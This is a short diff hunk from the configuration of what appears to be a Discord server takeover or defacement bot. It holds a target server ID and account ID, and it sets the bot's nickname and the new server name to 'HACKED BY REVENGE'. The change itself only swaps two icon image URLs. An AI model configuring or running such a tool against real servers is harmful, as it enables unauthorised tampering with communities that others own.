@@ -89,8 +89,8 @@ client.on("ready", () => {
         "targetServerID": "645134594718433281",
         "accountID": "597173029511888966",
         "botNickname": "HACKED BY REVENGE",
-        "botIcon": 'https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png',
-        "newServerIcon": "https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png",
+        "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
+        "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
         "newServerName": "HACKED BY REVENGE",
     }
 
